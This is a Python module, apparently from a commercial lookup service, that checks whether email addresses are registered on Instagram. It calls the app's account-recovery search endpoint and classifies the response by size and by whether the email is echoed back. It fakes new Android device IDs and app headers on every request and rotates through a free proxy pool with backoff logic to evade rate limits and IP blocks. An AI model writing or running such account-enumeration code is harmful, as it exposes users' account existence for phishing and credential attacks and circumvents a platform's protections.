"""
Instagram account-lookup service (CAA/bloks search endpoint).

The endpoint Instagram's own Android app calls while typing in the
account-recovery ("forgot password") screen:
  POST i.instagram.com/api/v1/bloks/async_action/
       com.bloks.www.caa.ar.search.async/

Verified behaviour (2026-10-22, direct + via free proxies):
  * registered email  -> ~400KB JSON, email echoed, embedded recovery
                         screen present
  * unknown email     -> ~50KB JSON ("sorry something went wrong"
                         dialog tree), email NOT echoed, no embedded
                         screen
  * no captcha so far; VPS/datacenter IPs may still get blocked ->
    we fall back to the shared proxy pool automatically.

Result statuses (only the first two are billable):
  ig_connected     -> email has an Instagram account
  ig_not_connected -> no Instagram account found
  ig_error         -> blocked / weird response / network (FREE, no credit)
"""
import base64
import collections
import json
import random
import re
import secrets
import threading
import time
import uuid
from datetime import datetime

import requests

import config
from services import proxy_pool

_URL = ("https://i.instagram.com/api/v1/bloks/async_action/"
        "com.bloks.www.caa.ar.search.async/")
_EMAIL_RE = re.compile(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}")

# ---- global pacing: Instagram is sensitive to bursts from one IP ----
_pace_lock = threading.Lock()
_last_call = 0.0


def _pace():
    global _last_call
    with _pace_lock:
        now = time.time()
        wait = config.INSTA_MIN_INTERVAL - (now - _last_call)
        if wait > 0:
            time.sleep(wait)
        _last_call = time.time()


def _build(query):
    """Fresh device identity per request (same shape the app sends)."""
    device = "android-" + "".join(random.choices("abcdef0123456789", k=16))
    family = str(uuid.uuid4())
    android = "android-" + "".join(random.choices("abcdef0123456789", k=16))
    waterfall = str(uuid.uuid4())
    params = (
        "{\"client_input_params\":{\"aac\":\"{\\\"aac_init_timestamp\\\":"
        + str(int(time.time()))
        + ",\\\"aacjid\\\":\\\"" + str(uuid.uuid4())
        + "\\\",\\\"aaccs\\\":\\\"" + secrets.token_urlsafe(32)
        + "\\\"}\",\"flash_call_permissions_status\":{\"READ_PHONE_STATE\":\"PERMANENTLY_DENIED\",\"READ_CALL_LOG\":\"DENIED\",\"ANSWER_PHONE_CALLS\":\"DENIED\"},\"was_headers_prefill_available\":0,\"network_bssid\":null,\"sfdid\":\"\",\"fetched_email_token_list\":{},\"search_query\":\""
        + query
        + "\",\"auth_secure_device_id\":\"\",\"ig_oauth_token\":[],\"cloud_trust_token\":null,\"was_headers_prefill_used\":0,\"sso_accounts_auth_data\":[],\"encrypted_msisdn\":\"\",\"device_network_info\":null,\"text_input_id\":\"akyuf0:61\",\"zero_balance_state\":null,\"android_build_type\":\"release\",\"accounts_list\":[],\"is_oauth_without_permission\":0,\"ig_android_qe_device_id\":\""
        + device
        + "\",\"gms_incoming_call_retriever_eligibility\":\"client_not_supported\",\"search_screen_type\":\"email_or_username\",\"is_whatsapp_installed\":1,\"lois_settings\":{\"lois_token\":\"\"},\"ig_vetted_device_nonce\":null,\"headers_infra_flow_id\":\"\",\"fetched_email_list\":[]},\"server_params\":{\"event_request_id\":\""
        + str(uuid.uuid4())
        + "\",\"is_from_logged_out\":0,\"layered_homepage_experiment_group\":null,\"device_id\":\""
        + android
        + "\",\"login_surface\":\"login_home\",\"waterfall_id\":\""
        + waterfall
        + "\",\"INTERNAL__latency_qpl_instance_id\":6.3987980400102E13,\"is_platform_login\":0,\"context_data\":\"\",\"login_entry_point\":\"logged_out\",\"INTERNAL__latency_qpl_marker_id\":36707139,\"family_device_id\":\""
        + family
        + "\",\"offline_experiment_group\":\"caa_iteration_v3_perf_ig_4\",\"access_flow_version\":\"pre_mt_behavior\",\"is_from_logged_in_switcher\":0,\"qe_device_id\":\""
        + device + "\"}}"
    )
    bloks_ver = ("5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b")
    payload = {
        "params": params,
        "bk_client_context": (
            "{\"bloks_version\":\"" + bloks_ver
            + "\",\"styles_id\":\"instagram\"}"
        ),
        "bloks_versioning_id": bloks_ver,
    }
    headers = {
        "User-Agent": ("Instagram 320.0.0.34.109 Android (33/13; 420dpi; "
                       "1080x2340; samsung; SM-A546B; a54x; exynos1380; "
                       "en_US; 465123678)"),
        "accept-language": "en-IN, en-US",
        "x-bloks-version-id": bloks_ver,
        "x-fb-friendly-name": ("IgApi: bloks/async_action/"
                               "com.bloks.www.caa.ar.search.async/"),
        "x-ig-android-id": android,
        "x-ig-app-id": "567067343352427",
        "x-ig-app-locale": "en_IN",
        "x-ig-client-endpoint": "com.bloks.www.caa.ar.search",
        "x-ig-device-id": device,
        "x-ig-family-device-id": family,
        "x-ig-timezone-offset": str(int(datetime.now().astimezone()
                                        .utcoffset().total_seconds())),
        "x-mid": base64.urlsafe_b64encode(secrets.token_bytes(18))
                    .decode().rstrip("="),
        "x-pigeon-rawclienttime": str(time.time()),
        "x-pigeon-session-id": f"UFS-{uuid.uuid4()}-0",
        "sec-ch-ua": ('"Google Chrome";v="149", "Chromium";v="149", '
                      '"Not)A;Brand";v="24"'),
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
    }
    return payload, headers


def _post(query, proxy=None):
    payload, headers = _build(query)
    proxies = {"http": proxy, "https": proxy} if proxy else None
    _pace()
    return requests.post(_URL, data=payload, headers=headers,
                         proxies=proxies, timeout=(5, config.INSTA_TIMEOUT),
                         allow_redirects=False)


def _classify(query, resp):
    """
    -> ("ig_connected"|"ig_not_connected"|"ig_error", detail)

    Verified shapes (2026-10-22, 11-email differential matrix via proxies):
      * code screen     ~408-443KB, email echoed, embedded payloads
      * recovery picker ~374-378KB, NOT echoed, embedded payloads,
        carries the passkey/password/whatsapp recovery-method tree
        (bloks id com.bloks.www.caa.ar.uhl.nav.async)
        -> BOTH of the above mean the account EXISTS -> ig_connected
      * not found       exactly 50097 bytes, nothing embedded -> not connected
    """
    body = resp.text or ""
    if resp.status_code != 200:
        return "ig_error", f"http_{resp.status_code}"
    try:
        data = json.loads(body)
    except Exception:
        return "ig_error", "non_json"          # challenge/HTML page
    if data.get("status") != "ok":
        return "ig_error", f"status_{data.get('status')}"

    echoed = query.lower() in body.lower()
    has_screen = "embedded_payloads" in body
    size = len(body)

    # account found: full recovery screen embedded.
    if has_screen and size > 100000:
        if echoed:
            return "ig_connected", f"len={size}"          # straight to code
        if "passkey" in body and "caa.ar.uhl" in body:
            # recovery-method picker -> account exists, methods listed
            return "ig_connected", f"picker len={size}"
        return "ig_error", (f"unexpected len={size} "
                            f"echoed=False embedded=True")
    # unknown: small fixed-size "sorry" dialog, nothing embedded
    if (not echoed) and (not has_screen) and size < 100000:
        return "ig_not_connected", f"len={size}"
    # anything else is unexpected -> don't guess, don't bill
    return "ig_error", f"unexpected len={size} echoed={echoed} embedded={has_screen}"


# ---- IG-local proxy memory -----------------------------------------------
# Instagram rate-limits an exit IP much more eagerly than hi2.in does, and
# the shared pool's throttle streaks are calibrated for hi2.in. Reporting
# IG-429s there would put cooldowns on proxies the hi2.in checker still
# likes (and vice-versa: a hi2.in "throttle" streak would hide a proxy
# that is perfectly fine for Instagram). So the IG feature keeps its own
# tiny memory on top of the shared list:
#   * _ig_good: exits that gave a definitive IG answer recently -> tried first
#   * _ig_cool: exits Instagram429'd/challenged -> IG-local backoff only
# Shared-pool reports stay limited to genuinely dead exits (network errors).
_mem_lock = threading.Lock()
_ig_good = collections.OrderedDict()   # url -> last definitive-ok ts (1h TTL)
_ig_cool = {}                          # url -> (until_ts, streak)


def _ig_note_good(url):
    now = time.time()
    with _mem_lock:
        _ig_good.pop(url, None)
        _ig_good[url] = now
        while len(_ig_good) > 64:
            _ig_good.popitem(last=False)


def _ig_note_bad(url, kind):
    """kind='block' (IG 429/challenge) -> IG-local cooldown, no shared report."""
    now = time.time()
    with _mem_lock:
        _ig_good.pop(url, None)
        if kind == "block":
            _until, streak = _ig_cool.get(url, (0.0, 0))
            streak += 1
            delay = min(30 * (2 ** (streak - 1)), 600)
            _ig_cool[url] = (now + delay, streak)


def _ig_candidates(max_n=5):
    """Recently successful IG exits that are not IG-cooling right now."""
    now = time.time()
    out = []
    with _mem_lock:
        for url, ts in list(_ig_good.items()):
            if now - ts > 3600.0:            # stale memory, drop it
                _ig_good.pop(url, None)
                continue
            cool = _ig_cool.get(url)
            if cool and cool[0] > now:
                continue
            out.append(url)
            if len(out) >= max_n:
                break
    return out


def _try_proxy(email):
    """
    Try IG-known-good exits first, then a fresh walk of the shared pool.

    Returns (result_or_None, reasons) where reasons maps every per-attempt
    failure tag to how often it happened - the caller logs it on failure so
    production problems are diagnosable from the [insta] log line alone.
    """
    attempts = max(1, config.INSTA_MAX_ATTEMPTS)
    reasons = {}
    tried = set()

    def _tag(t):
        reasons[t] = reasons.get(t, 0) + 1

    def _attempt(px):
        try:
            resp = _post(email, proxy=px)
        except requests.exceptions.ProxyError:
            _tag("ProxyError")
            proxy_pool.report(px, "net")
            _ig_note_bad(px, "dead")
            return None
        except requests.exceptions.ConnectTimeout:
            _tag("ConnectTimeout")
            proxy_pool.report(px, "net")
            _ig_note_bad(px, "dead")
            return None
        except requests.exceptions.ReadTimeout:
            # slow exit, NOT dead: no shared quarantine, no IG cooldown
            _tag("ReadTimeout")
            return None
        except requests.exceptions.SSLError:
            _tag("SSLError")
            proxy_pool.report(px, "net")
            _ig_note_bad(px, "dead")
            return None
        except requests.exceptions.ConnectionError:
            _tag("ConnectionError")
            proxy_pool.report(px, "net")
            _ig_note_bad(px, "dead")
            return None
        except Exception as e:
            _tag(type(e).__name__)
            return None

        status, detail = _classify(email, resp)
        if status == "ig_error":
            _tag(detail)
            _ig_note_bad(px, "block")        # IG-local backoff only
            return None
        proxy_pool.report(px, "ok")          # shared budget stays accurate
        _ig_note_good(px)
        return {"email": email, "status": status, "via": "proxy"}

    # 1) exits that answered a definitive IG answer in the last hour
    for px in _ig_candidates():
        if len(tried) >= attempts:
            break
        if px in tried:
            continue
        tried.add(px)
        got = _attempt(px)
        if got:
            return got, reasons

    # 2) fresh walk over the shared pool
    spins = 0
    max_spins = attempts * 8 + 16            # guard against a tiny pool
    while len(tried) < attempts and spins < max_spins:
        spins += 1
        px = proxy_pool.acquire()
        if not px:
            break                            # nothing usable right now
        if px in tried:
            continue                         # already burned this attempt
        tried.add(px)
        got = _attempt(px)
        if got:
            return got, reasons
    return None, reasons


def check_insta_email(email: str) -> dict:
    """
    Check if an email is registered on Instagram.
    Returns {"email", "status": ig_*, "via": "direct"|"proxy"}.
    Never raises; ig_error = transient (caller must NOT bill).

    INSTA_PROXY_FIRST=1 (default): leave through the proxy pool FIRST
    (the VPS IP is a datacenter IP -> Instagram challenges it) and only
    fall back to direct when the pool has nothing usable.
    """
    email = (email or "").strip().lower()
    if not _EMAIL_RE.fullmatch(email):
        return {"email": email, "status": "ig_error", "via": "-"}

    first_err = "-"
    fail_reasons = {}
    if config.INSTA_PROXY_FIRST:
        got, fail_reasons = _try_proxy(email)
        if got:
            return got
        # pool dry -> direct may still work (laptop/home IPs)
        try:
            resp = _post(email)
            status, detail = _classify(email, resp)
            if status != "ig_error":
                return {"email": email, "status": status, "via": "direct"}
            first_err = detail
        except Exception as e:
            first_err = type(e).__name__
    else:
        try:
            resp = _post(email)
            status, detail = _classify(email, resp)
            if status != "ig_error":
                return {"email": email, "status": status, "via": "direct"}
            first_err = detail
        except Exception as e:
            first_err = type(e).__name__
        got, fail_reasons = _try_proxy(email)
        if got:
            return got

    try:
        rs = " ".join(f"{k}x{v}" for k, v in sorted(
            fail_reasons.items(), key=lambda kv: -kv[1]))
        ps = proxy_pool.stats()
        print(f"[insta] {email}: FAIL attempts={sum(fail_reasons.values())} "
              f"[{rs}] direct={first_err} "
              f"pool(usable={ps['usable']} cool={ps['cooldown']} "
              f"qtn={ps['quarantined']}) ig_good={len(_ig_candidates(99))}")
    except Exception:
        pass
    return {"email": email, "status": "ig_error", "via": "-"}
